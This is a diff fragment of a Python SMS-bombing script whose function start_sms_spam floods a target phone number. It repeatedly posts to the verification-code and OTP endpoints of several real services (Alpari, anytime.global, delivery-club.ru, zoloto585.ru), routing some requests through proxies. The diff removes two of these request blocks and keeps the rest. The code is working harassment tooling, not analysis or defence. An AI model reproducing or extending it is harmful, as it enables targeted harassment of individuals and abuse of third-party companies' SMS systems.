@@ -326,25 +326,11 @@ async def start_sms_spam(phone, cycles):
                 logger.debug('[+] Youla sent!')
             except:
                 logger.warning('[-] Not sent!')
-
-            try:
-                requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/',json={"client_type": "personal", "email": f"{email}@gmail.ru","mobile_phone": _phone, "deliveryOption": "sms"})
-                logger.debug('[+] Alpari sent!')
-            except:
-                logger.warning('[-] Not sent!')
-
-            try:
-                requests.post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode",data={"phone": _phone})
-                logger.debug('[+] SMS sent!')
-            except:
-                logger.warning('[-] Not sent!')
-
             try:
                 requests.post('https://www.delivery-club.ru/ajax/user_otp', data={"phone": _phone})
                 logger.debug('[+] Delivery sent!')
             except:
                 logger.warning('[-] Not sent!')
-
             try:
                 phonee=mask(str=phone, maska="+# (###) ###-##-##")
                 requests.post("https://zoloto585.ru/api/bcard/reg/", json={"name":"","surname":"","patronymic":"","sex":"m","birthdate":"..","phone":phonee,"email":"","city":""}, proxies=proxies, timeout=15)
